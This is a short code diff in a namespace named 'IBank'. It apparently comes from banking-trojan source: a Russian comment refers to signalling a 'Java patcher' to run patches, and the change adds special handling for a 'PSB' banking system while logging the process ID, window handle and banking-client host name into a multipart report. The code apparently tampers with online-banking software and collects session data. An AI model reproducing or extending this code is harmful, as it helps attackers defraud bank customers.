@@ -279,7 +279,8 @@ namespace IBank
 
 		// Сигнализируем ява патчеру о необходимости запуска патчей
 		#ifdef JAVS_PATCHERH
-			JavaPatcherSignal();
+			if (!IsPSBSystem())
+				JavaPatcherSignal();
 		#endif
 
 
@@ -405,8 +406,13 @@ namespace IBank
 		MultiPartData::AddLongAsStr(Data,   "pid",  Log->PID);
 		MultiPartData::AddLongAsStr(Data,   "hwnd", (DWORD)Log->Wnd);
 
+
 		#ifdef JavaClient2015SaverH
-			string Host = GetJavaClient2015HkstName();
+			string Host;
+			if (IsPSBSystem())
+				Host = "PSB";
+			else
+				Host = GetJavaClient2015HostName();
 			if (!Host.IsEmpty())
                 MultiPartData::AddStringField(Data, "host",  Host.t_str());
 		#endif
